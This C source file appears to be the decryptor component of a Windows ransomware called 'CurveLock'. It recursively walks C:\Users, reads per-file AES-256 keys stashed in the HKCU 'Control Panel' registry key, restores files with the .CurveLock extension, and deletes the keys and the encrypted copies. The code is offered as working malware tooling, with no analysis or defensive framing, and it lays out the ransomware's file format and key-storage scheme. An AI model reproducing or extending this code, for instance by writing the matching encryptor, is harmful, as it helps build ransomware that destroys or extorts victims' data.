#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <bcrypt.h>
#include <shlwapi.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma warning(disable : 4996)

#define ENCRYPTED_FILE_EXTENSION    L".CurveLock"
#define ENC_FILE_SIGNATURE          'CVLK'
#define AES_KEY_SIZE                32
#define AES_BLOCK_SIZE              16

#define GET_FILE_EXTENSION_W(FilePath)       (wcsrchr(FilePath, L'.') ? wcsrchr(FilePath, L'.') : NULL)

// Registry key to read / write
#define REGISTRY            "Control Panel"

typedef struct _ENCRYPTED_FILE_HEADER {
    BYTE    Signature[0x04];
    BYTE    IV[AES_BLOCK_SIZE];
} ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;

BOOL ReadKeyFromRegistry(IN LPCSTR lpSubKey, OUT PBYTE pbKey, IN DWORD dwKeySize) {
    BOOL        bSTATE = TRUE;
    LSTATUS     STATUS = NULL;
    HKEY        hKey = NULL;
    DWORD       dwType = REG_BINARY;
    DWORD       dwSize = dwKeySize;

    printf("[i] Reading key from \"%s\\%s\" ... ", REGISTRY, lpSubKey);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_QUERY_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegQueryValueExA(hKey, lpSubKey, NULL, &dwType, pbKey, &dwSize);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegQueryValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");

_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

BOOL DeleteKeyFromRegistry(IN LPCSTR lpSubKey) {
    LSTATUS STATUS = RegDeleteKeyValueA(HKEY_CURRENT_USER, REGISTRY, lpSubKey);
    if (STATUS != ERROR_SUCCESS) {
        printf("[!] RegDeleteKeyValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }
    printf("[i] Deleted key \"%s\\%s\" \n", REGISTRY, lpSubKey);
    return TRUE;
}

BOOL Aes256DecryptBuffer(BYTE* pbKey, BYTE* pbIV, BYTE* pbData, DWORD cbData, BYTE* pbDecryptedData, DWORD* pcbDecryptedData) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject, cbDataOut, cbResult;
    PBYTE pbKeyObject = NULL;

    if (!pbKey || !pbIV || !pbData || !pbDecryptedData || !pcbDecryptedData) {
        return FALSE;
    }

    // Open an algorithm handle
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
        printf("[!] Failed to open algorithm provider\n");
        return FALSE;
    }

    // Calculate the size of the buffer to hold the KeyObject
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) {
        printf("[!] Failed to get object length\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Allocate the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        printf("[!] Memory allocation failed\n");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Generate the key from supplied input key bytes
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, pbKey, AES_KEY_SIZE, 0) != 0) {
        printf("[!] Failed to generate symmetric key\n");
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // Decrypt the data
    if (BCryptDecrypt(hKey, pbData, cbData, NULL, pbIV, AES_BLOCK_SIZE, pbDecryptedData, *pcbDecryptedData, &cbDataOut, BCRYPT_BLOCK_PADDING) != 0) {
        printf("[!] Failed to decrypt data\n");
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    *pcbDecryptedData = cbDataOut;

    // Clean up
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return TRUE;
}

BOOL ReplaceWithDecryptedFile(IN LPWSTR szFilePathToDecrypt, int fileIndex) {
    HANDLE                  hSourceFile = INVALID_HANDLE_VALUE,
        hDestinationFile = INVALID_HANDLE_VALUE;
    ULONG_PTR               uFileBufferAddr = NULL,
        uDecryptedFileBufferAddr = NULL,
        uTmpPntrVar = NULL;
    DWORD                   dwTmpSizeVar = 0x00,
        dwFileBufferSize = 0x00,
        dwNumberOfBytesRead = 0x00,
        dwNumberOfBytesWritten = 0x00;
    BOOL                    bResult = FALSE;
    PWCHAR                  pwcDuplicateStr = NULL,
        pwcOgFileExtension = NULL,
        pwcDecryptedFilePath = NULL;
    ENCRYPTED_FILE_HEADER   EncryptedFileHeader = { 0 };
    BYTE                    pbKey[AES_KEY_SIZE] = { 0 };

    if (!szFilePathToDecrypt)
        return FALSE;

    if (!(pwcDuplicateStr = _wcsdup(szFilePathToDecrypt)))
        goto _END_OF_FUNC;

    dwTmpSizeVar = (wcslen(pwcDuplicateStr) - wcslen(ENCRYPTED_FILE_EXTENSION) + 0x01) * sizeof(WCHAR);

    if (!(uTmpPntrVar = pwcDecryptedFilePath = (PWCHAR)malloc(dwTmpSizeVar)))
        goto _END_OF_FUNC;
    else
        wcsncpy_s(pwcDecryptedFilePath, dwTmpSizeVar, pwcDuplicateStr, wcslen(pwcDuplicateStr) - wcslen(ENCRYPTED_FILE_EXTENSION));

    if ((hSourceFile = CreateFileW(szFilePathToDecrypt, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if ((dwFileBufferSize = GetFileSize(hSourceFile, NULL)) == INVALID_FILE_SIZE) {
        printf("[!] GetFileSize Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(uFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)dwFileBufferSize))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(uDecryptedFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)(dwFileBufferSize - sizeof(ENCRYPTED_FILE_HEADER))))) {
        printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (SetFilePointer(hSourceFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ReadFile(hSourceFile, uFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesRead, NULL) || dwFileBufferSize != dwNumberOfBytesRead) {
        printf("[!] ReadFile Failed With Error: %d\n", GetLastError());
        printf("[i] Read %d Of %d Bytes\n", dwNumberOfBytesRead, dwFileBufferSize);
        goto _END_OF_FUNC;
    }

    memcpy(&EncryptedFileHeader, (PBYTE)uFileBufferAddr, sizeof(ENCRYPTED_FILE_HEADER));

    if (memcmp(EncryptedFileHeader.Signature, "CVLK", 4) != 0) {
        printf("[!] File Not Encrypted \n");
        goto _END_OF_FUNC;
    }

    // Generate a unique registry key name based on the file index
    char regKeyName[MAX_PATH];
    _snprintf_s(regKeyName, sizeof(regKeyName), _TRUNCATE, "CurveLock_%d", fileIndex);

    // Debugging information
    printf("[i] Generated registry key name: %s\n", regKeyName);

    // Read the AES key from the registry
    if (!ReadKeyFromRegistry(regKeyName, pbKey, AES_KEY_SIZE)) {
        goto _END_OF_FUNC;
    }

    DWORD cbDecryptedData = dwFileBufferSize - sizeof(ENCRYPTED_FILE_HEADER);
    if (!Aes256DecryptBuffer(pbKey, EncryptedFileHeader.IV, (BYTE*)(uFileBufferAddr + sizeof(ENCRYPTED_FILE_HEADER)), cbDecryptedData, (BYTE*)uDecryptedFileBufferAddr, &cbDecryptedData))
        goto _END_OF_FUNC;

    if ((hDestinationFile = CreateFileW(pwcDecryptedFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!WriteFile(hDestinationFile, uDecryptedFileBufferAddr, cbDecryptedData, &dwNumberOfBytesWritten, NULL) || cbDecryptedData != dwNumberOfBytesWritten) {
        printf("[!] WriteFile Failed With Error: %d\n", GetLastError());
        printf("[i] Wrote %d Of %d Bytes\n", dwNumberOfBytesWritten, cbDecryptedData);
        goto _END_OF_FUNC;
    }

    if (!FlushFileBuffers(hDestinationFile)) {
        printf("[!] FlushFileBuffers Failed With Error: %d\n");
        goto _END_OF_FUNC;
    }

    if (!SetEndOfFile(hDestinationFile)) {
        printf("[!] SetEndOfFile Failed With Error: %d\n");
        goto _END_OF_FUNC;
    }

    // Close the source file handle before attempting to delete the file
    CloseHandle(hSourceFile);
    hSourceFile = INVALID_HANDLE_VALUE;

    // Delete the registry key after accessing its value
    if (!DeleteKeyFromRegistry(regKeyName)) {
        goto _END_OF_FUNC;
    }

    // Delete the encrypted file after decrypting it
    if (!DeleteFileW(szFilePathToDecrypt)) {
        printf("[!] DeleteFileW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hSourceFile != INVALID_HANDLE_VALUE)
        CloseHandle(hSourceFile);
    if (hDestinationFile != INVALID_HANDLE_VALUE)
        CloseHandle(hDestinationFile);
    if (pwcDuplicateStr)
        free(pwcDuplicateStr);
    if (uTmpPntrVar)
        free(uTmpPntrVar);
    if (uFileBufferAddr)
        LocalFree((HLOCAL)uFileBufferAddr);
    if (uDecryptedFileBufferAddr)
        LocalFree((HLOCAL)uDecryptedFileBufferAddr);
    return bResult;
}

BOOL DecryptFilesInGivenDir(IN LPCWSTR szDirectoryPath, int* fileIndex) {
    if (!szDirectoryPath)
        return FALSE;

    WIN32_FIND_DATAW    FindFileData = { 0x00 };
    WCHAR               szDirPath[MAX_PATH * 2] = { 0x00 };
    WCHAR               szFullStrPath[MAX_PATH * 2] = { 0x00 };
    HANDLE              hFind = INVALID_HANDLE_VALUE;
    BOOL                bResult = FALSE;

    _snwprintf_s(szDirPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\*", szDirectoryPath);

    if ((hFind = FindFirstFileW(szDirPath, &FindFileData)) == INVALID_HANDLE_VALUE) {
        printf("[!] FindFirstFileW Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    do {
        if (!wcscmp(FindFileData.cFileName, L".") || !wcscmp(FindFileData.cFileName, L".."))
            continue;

        _snwprintf_s(szFullStrPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\%s", szDirectoryPath, FindFileData.cFileName);

        if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            printf("[*] Directory: %ws\n", szFullStrPath);
            if (!DecryptFilesInGivenDir(szFullStrPath, fileIndex))
                goto _END_OF_FUNC;
        }

        if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            printf("\t> Decrypting File: %ws ... ", szFullStrPath);
            if (ReplaceWithDecryptedFile(szFullStrPath, (*fileIndex)++)) {
                printf("[+] DONE\n");
            }
            else {
                printf("[-] Failed\n");
            }
        }

    } while (FindNextFileW(hFind, &FindFileData));

    bResult = TRUE;

_END_OF_FUNC:
    if (hFind != INVALID_HANDLE_VALUE)
        FindClose(hFind);
    return bResult;
}

int main() {
    WCHAR DirectoryPath[MAX_PATH] = L"C:\\Users";
    int fileIndex = 1;
    DecryptFilesInGivenDir(DirectoryPath, &fileIndex);
    return 0;
}